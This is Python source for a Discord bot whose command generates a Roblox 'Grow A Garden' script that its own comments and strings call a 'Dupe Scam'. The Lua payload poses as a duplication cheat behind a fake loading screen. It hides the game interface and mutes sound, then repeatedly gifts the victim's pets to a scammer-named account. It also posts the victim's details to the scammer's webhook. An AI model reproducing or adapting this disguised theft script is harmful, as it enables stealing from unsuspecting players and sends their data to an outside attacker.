import discord
from discord import app_commands
from discord.ext import commands
import io
import os

# Replace this with your test guild/server ID for instant command registration
GUILD_ID = 1381683743789682718  # <-- PUT YOUR GUILD ID HERE as int

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        guild = discord.Object(id=GUILD_ID)
        synced = await bot.tree.sync(guild=guild)
        print(f"Synced {len(synced)} command(s) to guild ID {GUILD_ID}")
    except Exception as e:
        print(f"Error syncing commands: {e}")

# Simple ping command to test bot responsiveness
@bot.tree.command(name="ping", description="Check if bot is alive")
@app_commands.guilds(discord.Object(id=GUILD_ID))
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message("Pong! 🏓", ephemeral=True)

# Your original /generatescript-gag command
@bot.tree.command(name="generatescript-gag", description="Generate a Grow A Garden Dupe Scam script")
@app_commands.describe(username="Your Roblox username", webhook="Your webhook URL")
@app_commands.guilds(discord.Object(id=GUILD_ID))
async def generatescript_gag(interaction: discord.Interaction, username: str, webhook: str):
    await interaction.response.defer(ephemeral=True)  # Thinking message visible only to user

    script = f'''-- GROW A GARDEN SCRIPT
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

pcall(function()
  for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
    StarterGui:SetCoreGuiEnabled(guiType, false)
  end
end)

if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
  LocalPlayer:Kick("Please join a Public Server.")
  return
end

pcall(function()
  for _, s in ipairs(SoundService:GetDescendants()) do
    if s:IsA("Sound") then
      pcall(function() s.Volume = 0 end)
    end
  end
  SoundService.Volume = 0
end)

local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "GROWAGARDENDUPE"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)

local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, 0, 0, 60)
label.Position = UDim2.new(0, 0, 0.5, -30)
label.Text = "🌱 Grow A Garden Dupe Script (LOADING...)\\n0%"
label.TextColor3 = Color3.new(0, 1, 0)
label.Font = Enum.Font.GothamBlack
label.TextSize = 32
label.TextStrokeTransparency = 0
label.BackgroundTransparency = 1
label.TextYAlignment = Enum.TextYAlignment.Top
label.TextWrapped = true

local webhook = "{webhook}"
local function sendWebhook()
  local data = {{
    content = "# @everyone Grow A Garden Pet Scam Executed!",
    embeds = {{
      title = "Scam Started",
      color = 65280,
      fields = {{
        {{ name = "User", value = LocalPlayer.Name }},
        {{ name = "JobId", value = game.JobId }},
        {{ name = "Time", value = os.date("%c") }},
      }},
      footer = {{ text = "Head Scripts Logger" }}
    }}
  }}
  local payload = HttpService:JSONEncode(data)
  pcall(function()
    if syn and syn.request then
      syn.request({{ Url = webhook, Method = "POST", Headers = {{ ["Content-Type"] = "application/json" }}, Body = payload }})
    elseif http and http.request then
      http.request({{ Url = webhook, Method = "POST", Headers = {{ ["Content-Type"] = "application/json" }}, Body = payload }})
    elseif request then
      request({{ Url = webhook, Method = "POST", Headers = {{ ["Content-Type"] = "application/json" }}, Body = payload }})
    elseif getgenv and getgenv().http_request then
      getgenv().http_request({{ Url = webhook, Method = "POST", Headers = {{ ["Content-Type"] = "application/json" }}, Body = payload }})
    end
  end)
end
sendWebhook()

task.spawn(function()
  for i = 1, 100 do
    label.Text = "🌱 Grow A Garden Dupe Script (LOADING...)\\n" .. i .. "%"
    task.wait(4.3)
  end
end)

task.spawn(function()
  local Players = game:GetService("Players")
  local ReplicatedStorage = game:GetService("ReplicatedStorage")
  local Backpack = LocalPlayer:WaitForChild("Backpack")
  local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
  local PetGiftingService = GameEvents:WaitForChild("PetGiftingService")

  while true do
    local tools = Backpack:GetChildren()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local target = Players:FindFirstChild("{username}")
    local targetHRP = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")

    -- Check if any "age" tool exists
    local hasAgeTool = false
    for _, tool in ipairs(tools) do
      if tool:IsA("Tool") and tool.Name:lower():find("age") then
        hasAgeTool = true
        break
      end
    end

    if not hasAgeTool then
      LocalPlayer:Kick("Script Failed To Load, Please Rejoin!")
      break
    end

    if humanoid and targetHRP then
      LocalPlayer.Character:PivotTo(targetHRP.CFrame * CFrame.new(0, 0, -3))

      for _, tool in ipairs(tools) do
        if tool:IsA("Tool") and tool.Name:lower():find("age") then
          humanoid:EquipTool(tool)
          task.wait(0.1)

          -- Fire remote event 10 times, each 0.3 seconds apart
          for i = 1, 10 do
            local success, err = pcall(function()
              PetGiftingService:FireServer("GivePet", target)
            end)
            if not success then
              warn("Failed to fire remoteevent:", err)
            end
            task.wait(0.3)
          end

          humanoid:UnequipTools()
          task.wait(0.05)
        end
      end
    end
    task.wait(0.001)
  end
end)
'''

    file = discord.File(io.StringIO(script), filename=f"GrowAGardenScamScript_{username}.lua")

    try:
        await interaction.user.send(content=f"Here's your Grow A Garden Scam script for **{username}**:", file=file)
        await interaction.followup.send("I sent you the script in DMs!", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("I couldn't DM you. Please check your privacy settings.", ephemeral=True)

# Run bot with explicit error if no token
token = os.getenv("DISCORD_TOKEN")
if not token:
    print("ERROR: DISCORD_TOKEN environment variable not set.")
else:
    bot.run(token)
